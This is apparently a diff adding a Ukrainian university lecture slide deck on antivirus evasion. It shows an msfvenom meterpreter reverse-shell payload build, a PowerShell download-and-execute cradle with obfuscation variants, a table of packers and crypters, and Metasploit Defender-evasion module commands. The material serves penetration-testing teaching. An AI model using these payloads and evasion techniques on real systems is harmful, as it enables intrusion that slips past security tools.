@@ -1,0 +1,93 @@
+<!DOCTYPE html>
+<html lang="uk">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Тема 10.7 — Обхід антивірусів (Evasion)</title>
+  <link rel="icon" type="image/svg+xml" href="../../img/favicon.svg">
+  <link href="https://fonts.googleapis.com/css2?family=Plus+Jakarta+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../../css/slides.css">
+</head>
+<body data-lecture="10">
+  <div class="slide-deck">
+    <section class="slide active title-slide">
+      <h1>Обхід антивірусів (Evasion)</h1>
+      <div class="subtitle">Тема 10.7 — Утримання доступу та обхід антивірусів</div>
+      <p>Кафедра ТЕІБ, Ужгородський національний університет</p>
+    </section>
+
+    <section class="slide">
+      <h2>Encoders, Packers та Crypters</h2>
+      <div class="two-column" style="margin-top:1rem;">
+        <div class="column">
+          <div class="card-yellow">
+            <h3>Encoders (msfvenom)</h3>
+            <div class="code-block" style="margin-top:0.8rem;font-size:0.68em;">
+# shikata_ga_nai (XOR)
+msfvenom -p windows/
+  meterpreter/reverse_tcp
+  LHOST=192.168.1.50
+  LPORT=4444
+  -e x86/shikata_ga_nai
+  -i 5 -f exe -o encoded.exe
+
+# Кілька encoders
+msfvenom ... -e x86/shikata_ga_nai
+  -i 3 -e x86/countdown -i 2
+            </div>
+            <div class="warning-box" style="margin-top:0.8rem;font-size:0.8em;">
+              Encoders <strong>самі по собі</strong> не обходять сучасні AV!
+            </div>
+          </div>
+        </div>
+        <div class="column">
+          <div class="card-purple">
+            <h3>Packers / Crypters</h3>
+            <table class="comparison-table" style="font-size:0.75em;margin-top:0.8rem;">
+              <tbody>
+                <tr><td><strong>UPX</strong></td><td class="cell-red">Всі AV знають</td></tr>
+                <tr><td><strong>Themida</strong></td><td class="cell-yellow">Комерційний protector</td></tr>
+                <tr><td><strong>Veil</strong></td><td class="cell-green">Python/C/Go stubs</td></tr>
+                <tr><td><strong>Shellter</strong></td><td class="cell-green">PE injection</td></tr>
+                <tr><td><strong>ScareCrow</strong></td><td class="cell-green">Syscalls loader</td></tr>
+              </tbody>
+            </table>
+          </div>
+        </div>
+      </div>
+    </section>
+
+    <section class="slide">
+      <h2>Code Obfuscation</h2>
+      <div class="card-red" style="margin-bottom:1.5rem;">
+        <h3>PowerShell Obfuscation</h3>
+        <div class="code-block" style="margin-top:0.8rem;font-size:0.7em;">
+# Оригінал:
+IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.50/p.ps1')
+
+# String concatenation:
+$a='IEX (New-Ob'+'ject Net.We'+'bClient).Do'+'wnloadStr'+'ing(''http://...'')'; iex $a
+
+# Char array:
+$c=[char[]](73,69,88,32,40,78,101,119); -join $c | iex
+
+# Base64 encoding:
+[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('SQBFAFEA...'))
+        </div>
+      </div>
+      <div class="card-blue">
+        <h3>Metasploit Evasion Modules</h3>
+        <div class="code-block" style="margin-top:0.8rem;font-size:0.72em;">
+msf6&gt; use evasion/windows/windows_defender_exe
+msf6&gt; set PAYLOAD windows/meterpreter/reverse_tcp
+msf6&gt; generate
+        </div>
+      </div>
+    </section>
+  </div>
+  <div class="slide-counter" id="counter"></div>
+  <div class="slide-progress" id="progress"></div>
+  <div class="controls"><button id="btn-prev" onclick="prev()">&#8592;</button><button id="btn-next" onclick="next()">&#8594;</button></div>
+  <script src="../../js/slides.js"></script>
+</body>
+</html>
